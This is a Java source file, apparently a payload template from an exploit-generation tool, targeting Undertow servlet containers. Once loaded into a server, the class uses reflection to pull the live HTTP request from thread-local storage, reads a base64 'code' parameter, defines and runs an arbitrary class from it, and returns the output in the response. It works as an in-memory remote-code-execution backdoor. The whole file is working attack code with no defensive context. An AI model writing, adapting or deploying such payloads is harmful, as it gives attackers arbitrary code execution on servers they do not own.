package jeg.core.template.undertow;

import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class UndertowCodeExecTpl {

    private static String getReqParamName() {
        return "code";
    }

    public UndertowCodeExecTpl() {
        run();
    }

    private void run() {
        try {
            Thread thread = Thread.currentThread();
            Object threadLocals = getFV(thread, "threadLocals");
            Object table = getFV(threadLocals, "table");

            for (int i = 0; i < Array.getLength(table); i++) {
                Object entry = Array.get(table, i);
                if (entry == null) continue;
                Object value = getFV(entry, "value");
                if (value != null && value.getClass().getName().contains("ServletRequestContext")) {
                    Object request = getFV(value, "servletRequest");
                    String code = (String) invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{getReqParamName()});
                    if (code != null && code != "") {
                        Object response = getFV(value, "servletResponse");
                        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", new Class[0], new Object[0]);
                        writer.write(exec(code));
                        writer.flush();
                        writer.close();
                    }
                }
            }
        } catch (Exception e) {
        }
    }

    private synchronized Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class<?> clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }

    private synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Method method = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramClazz);
                break;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj, param);
    }


    private String exec(String var2) {
        try {
            byte[] clazzByte = base64Decode(var2);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), clazzByte, 0, clazzByte.length);
            return clazz.newInstance().toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }

    private byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

}
